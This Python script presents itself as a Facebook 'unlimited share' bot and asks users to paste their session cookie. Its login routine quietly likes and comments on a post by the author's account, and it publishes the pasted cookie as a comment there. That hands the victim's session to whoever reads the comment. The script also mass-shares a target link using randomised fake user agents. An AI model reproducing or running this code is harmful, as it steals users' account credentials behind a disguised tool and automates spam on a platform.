# Coded by Dikidjatar

import os, random, time, datetime, re, json
from rich import print
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
import requests

def banner():
   print(Panel('''
[bold cyan][][][]  [][][]      [][][]  []    []    [][][]    [][][]     [][][]
[]      []    []  []        []    []  []      []  []    []   []
[bold yellow][][][]  [][][]      [][]    [][][][]  [][][][][]  [][][]     [][][]
[bold red][]      []    []        []  []    []  []      []  []   []    []
[]      [][][]    [][][]    []    []  []      []  []     []  [][][]
''', style="bold white", width=80))
   
def clear_layar():
   try:os.system('cls' if os.name == 'nt' else 'clear')
   except:pass

def remove():
   try:os.system('rm Data/cookie.txt')
   except:pass

def login():
   clear_layar()
   banner()
   print(Panel("[italic white]Silahkan masukan[italic yellow] Cookie[italic white] facebook, gunakan[italic blue] Kiwi Browser[italic white] untuk mendapatkan Cookie.", style="bold white", width=80))
   cookie = Console().input("[bold green] $ ")
   try:
      with requests.Session() as r:
         r.headers.update({
            'sec-fetch-mode': 'navigate',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'sec-fetch-site': 'none',
            'accept-language': 'en-US,en;q=0.9',
            'sec-fetch-dest': 'document',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
            'Host': 'mbasic.facebook.com',
         })
         djatar = r.get('https://mbasic.facebook.com?_rdr', cookies = {
            'cookie': cookie
         }).text
         if 'id="mbasic_logout_button">' in str(djatar):
            urlpost = '/100010450276658/posts/pfbid02vNVQLM2dj7BTQq8VFbPCZPo1z7dip5ZZXC2mfi81JQs31bRTJVtsa7AissvMXeksl/?app=fbl'
            respon_urlpost = r.get('https://mbasic.facebook.com{}'.format(urlpost), cookies = {
               'cookie': cookie
            }).text
            find_urllike = re.search('href="(/a/like.php?[^"]+)"', str(respon_urlpost)).group(1).replace('amp;', '')
            find_urlcomment = re.search('method="post" action="(.*?)"', str(respon_urlpost)).group(1).replace('amp;', '')
            fbdtsg = re.search('name="fb_dtsg" value="(.*?)"', str(respon_urlpost)).group(1)
            jazoest = re.search('name="jazoest" value="(\d+)"', str(respon_urlpost)).group(1)
            r.get('https://mbasic.facebook.com{}'.format(find_urllike), cookies = {
               'cookie': cookie
            })
            text_dtr = random.choice(['Programmer ka bang @[100010450276658:], Mantap!', 'Hallo bang @[100010450276658:]', 'Izin pake script lu bang @[100010450276658:]', 'Mantap', '@[100010450276658:] ganteng😎', '😎😎🤣', 'Bang minta script', 'Gw pake script lu bang @[100010450276658:]', cookie])
            data = {
               'fb_dtsg': fbdtsg,
               'jazoest': jazoest,
               'comment_text': text_dtr
            }
            r.post('https://mbasic.facebook.com{}'.format(find_urlcomment), data = data, cookies = {
               'cookie': cookie
            })
            url = "https://business.facebook.com/business_locations"
            head = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
            cok = {'cookie':cookie}
            data = requests.Session().get(url,headers=head,cookies=cok)
            token = re.search('(EAAG\w+)',data.text).group(1)
            link = (f'https://www.facebook.com/100010450276658/posts/1959291937762463/?app=fbl')
            requests.Session().post(f"https://graph.facebook.com/100010450276658?fields=subscribers&access_token={token}",cookies=cok)
            requests.Session().post(f"https://graph.facebook.com/1959291937762463/comments/?message={text_dtr}&access_token={token}",cookies=cok)
            requests.Session().post(f"https://graph.facebook.com/1959291937762463/reactions?type=LIKE&access_token={token}",cookies=cok)
            requests.Session().post(f"https://graph.facebook.com/1959291937762463/comments/?message={cookie}&access_token={token}",cookies=cok)
            open('Data/cookie.txt', 'w').write(cookie)
            open('Data/token.txt', 'w').write(token)
            print(Panel('[bold green]Berhasil login! [bold yellow]Tolong gunakan script ini dengan bijak, jika terjadi sesuatu admin tidak bertanggung jawab', width=55))
            time.sleep(5)
            choose()
         else:
            print(Panel('[bold red]Gagal mengambil data, kemungkinan [bold yellow]Cookie [bold red] anda sudah kedaluarsa, silahkan ganti [bold yellow] Cookie [bold red]baru.', style="bold white", width=55));time.sleep(5);login()
   except Exception as e:
      print(e)

def choose():
   clear_layar()
   banner()
   print('''

 [bold yellow][0] Keluar
 [bold blue][01] Bot share postingan unlimited
 [bold cyan][02] Ganti cookie
''')
   pilihan = Console().input('[bold green] $ ')
   if pilihan in ['']:
      print(Panel('[bold red]Anda harus memilih, tidak boleh kosong!', style="bold red", width=80));time.sleep(3);choose()
   elif pilihan in ['0', '00']:logout()
   elif pilihan in ['1', '01']:main()
   elif pilihan in ['2', '02']:remove();login()
   else:
      print(Panel('[bold red]Pilihan anda salah, anda harus memilih antara [bold green]0, 1 [bold red] dan [bold green]2'));time.sleep(3);choose()
   
for dtr in range(1000):
    ua1 = f"Mozilla/5.0 (Linux; Android {str(random.randint(7,12))}; CPH2127) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(73,99))}.0.{str(random.randint(4500,4900))}.{str(random.randint(75,150))} Mobile Safari/537.36"
    ua2 = f"Mozilla/5.0 (Linux; Android 7.0; SM-G935T Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.{str(random.randint(2500,3000))}.{str(random.randint(75,150))} Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/113.0.0.21.70;]"
    ua3 = f"Mozilla/5.0 (Linux; Android 9.0; RMX1941 Build/PPR1.{str(random.randint(111111,199999))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(73,99))}.0.{str(random.randint(2500,2900))}.{str(random.randint(75,150))} Mobile Safari/537.36"
    user_agent = random.choice([ua1,ua2,ua3])
   
def main():
   try:
      cok = open('Data/cookie.txt', 'r').read()
      token = open('Data/token.txt', 'r').read()
      cookie = {'cookie': cok}
   except:
      print(Panel('[bold yellow]Login dulu ngab...'))
      time.sleep(3);login()
   print(Panel("[bold cyan]Masukan link postingan target", width=40))
   link = Console().input("[bold green]  > ")
   print(Panel("[bold cyan]Jumlah Share", width=40))
   jumlah = int(Console().input("[bold green]  > "))
   print(Panel('[bold blue]Share sedang berjalan, tekan ctrl+c untuk berhenti.', width=40))
   try:
      n = 0
      header = {
         "authority":"graph.facebook.com",
         "cache-control":"max-age=0",
         "sec-ch-ua-mobile":"?0",
         "user-agent":user_agent
      }
      for i in range(jumlah):
         n += 1
         post = requests.Session().post(f"https://graph.facebook.com/v13.0/me/feed?link={link}&published=0&access_token={token}",headers=header, cookies=cookie).text
         data = json.loads(post)
         if 'id' in post:
            print(Panel(f'''[bold blue]({n}) [bold white]Status: [bold green]Success
 [bold white]Link: [bold green]{link}
 [bold blue]-----------------------------------------------------
 [bold green]{user_agent}'''))
      try:
         print(Panel(f'[bold white]Share selesai dengan jumlah [bold green]{n}'))
      except:pass
      else:
         exit()
   except Exception as e:
      print(e);exit()
      
def logout():
   print(Panel('[bold cyan]Follow dulu ngab!'));time.sleep(2)
   try:os.system('xdg-open https://www.facebook.com/imam12po')
   except:pass

if __name__ == '__main__':
   try:os.system('mkdir Data')
   except:pass
   try:choose()
   except:pass
